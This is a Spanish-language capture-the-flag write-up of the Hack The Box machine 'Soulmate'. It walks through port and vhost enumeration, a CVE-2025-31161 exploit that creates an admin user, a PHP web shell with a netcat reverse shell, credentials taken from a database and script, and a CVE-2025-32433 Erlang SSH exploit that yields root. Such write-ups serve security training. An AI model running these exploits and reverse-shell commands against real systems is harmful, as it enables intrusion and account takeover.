## 1. Introducción
### 1.1 Antecedentes
La máquina **Soulmate** de **Hack The Box** es un entorno Linux de dificultad _Easy_ que se centra en la enumeración y explotación de una aplicación web con temática de citas, además de un servicio SSH expuesto.

El objetivo principal consiste en identificar vulnerabilidades dentro de la aplicación para obtener acceso inicial al sistema y posteriormente realizar una escalada de privilegios hasta comprometer la cuenta root.
### 1.1 Objetivos
Durante la resolución de esta máquina se refuerzan los siguientes conceptos:

- Aplicación de una **metodología de enumeración estructurada**.
- Identificación y explotación de **vulnerabilidades web**.
- Obtención de acceso inicial en entornos Linux.
- Análisis de configuraciones inseguras. 
- Técnicas básicas de **escalada de privilegios**.
## 2. Enumeración
### 2.1 Reconocimiento inicial

Comenzamos verificando conectividad:
```bash
❯ ping -c1 soulmate.htb
```
El host responde correctamente, confirmando que está activo.
### 2.2 Nmap
Escaneo completo de puertos:
```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 soulmate.htb -oN allports --open
```
Resultado:

- 22/tcp – SSH
- 80/tcp – HTTP

Posteriormente, se realiza un escaneo detallado de servicios y versiones:
```bash
❯ nmap -p22,80 -Pn -sCV -oN targeted soulmate.htb
```
Resultados relevantes:

- **SSH**: OpenSSH 8.9p1 (Ubuntu)
- **HTTP**: nginx 1.18.0 (Ubuntu)
- El título del sitio es: _Soulmate - Find Your Perfect Match_
- Cookie PHPSESSID sin flag `httponly`
### 2.3 Gobuster
Se procede con enumeración de virtual hosts:
```bash
❯ gobuster vhost --domain 'soulmate.htb' --append-domain \
-u http://10.129.3.237 \
-w /usr/share/seclists/Discovery/DNS/namelist.txt \
-t 100 -o vhost.txt
```
Se descubre:
```
ftp.soulmate.htb → 302 → /WebInterface/login.html
```
<img width="1888" height="696" alt="image" src="https://github.com/user-attachments/assets/b4a39a7c-f7f5-40d0-8276-4c9fc1fe6d7b" />

## 3. Explotación
### 3.1 Explotación inicial
Se identifica en el código fuente una versión asociada:
<img width="661" height="212" alt="image" src="https://github.com/user-attachments/assets/1bd04344-f9c3-4c57-9588-79ef569c09c6" />

Se identifica un posible vector asociado a un servicio vulnerable y se prueba el exploit:
<img width="1380" height="488" alt="image" src="https://github.com/user-attachments/assets/3abc9c58-fd4a-4c0c-92fa-0cd226329ad0" />

```bash
❯ python3 52295.py --target ftp.soulmate.htb --port 80 --exploit --new-user nuggetito --password nuggetito67

[36m          
  / ____/______  _______/ /_  / ____/ /_____ 
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/ 
                                    /_/      
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user nuggetito on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb
```
Resultado:
```
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```
Se obtiene acceso válido.
<img width="1177" height="729" alt="image" src="https://github.com/user-attachments/assets/ba527fbb-b810-451d-b43e-d9187d6c09bb" />

Se asignaron accesos a la cuenta:
*Admin > User Manager*
(https://benheater.com/content/images/2025/09/image-39-1.png)
<img width="1460" height="732" alt="image" src="https://github.com/user-attachments/assets/127abf7f-fe37-4fc5-9d0b-08fde2acd4c6" />

### 3.2 Obtención de Webshell
Se descarga una webshell PHP:
```bash
❯ wget https://github.com/WhiteWinterWolf/wwwolf-php-
```
Tras subirla y ejecutarla, se obtiene una reverse shell:
```bash
❯ sudo nc -lnvp 443
```
Conexión recibida:
```
❯ www-data@soulmate
```
### 3.3 Abuso de funcionalidad de lectura de archivos vía base de datos
Durante la exploración del sistema:
```bash
❯ cd data
❯ sqlite3 soulmate.db .dump
```
Se obtiene información relevante:
```
INSERT INTO users VALUES(
1,'admin',
'$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',
1,'Administrator',...
);
```
Además, revisando código fuente se observa la creación automática del usuario admin con contraseña:
```
Crush4dmin990
```
### 3.4 Movimiento lateral
Explorando procesos y archivos locales:
```bash
❯ cat /usr/local/lib/erlang_login/start.escript
```
Se encuentran nuevas credenciales:
```
ben:HouseH0ldings998
```
Acceso por SSH:
```bash
❯ ssh ben@10.129.3.237
```
Se obtiene la flag de usuario:
```
ben@soulmate:~$ ls
user.txt
```
## 4. Escalada de privilegios
Al revisar servicios locales:
``` bash
❯ nc 127.0.0.1 2222
```
Se identifica:
```
SSH-2.0-Erlang/5.2.9
```
Se localiza un exploit público:  
`CVE-2025-32433 – Erlang OTP SSH RCE`
En la máquina víctima se ejecuta:
```bash
❯ python3 cve-2025-32433.py -p 2222 --shell \
--lhost 10.10.15.4 --lport 9001 127.0.0.1
```
En la máquina atacante:
```bash
❯ nc -lvnp 9001
```
Conexión recibida:
```
whoami
root
```
Se obtiene acceso root exitosamente.

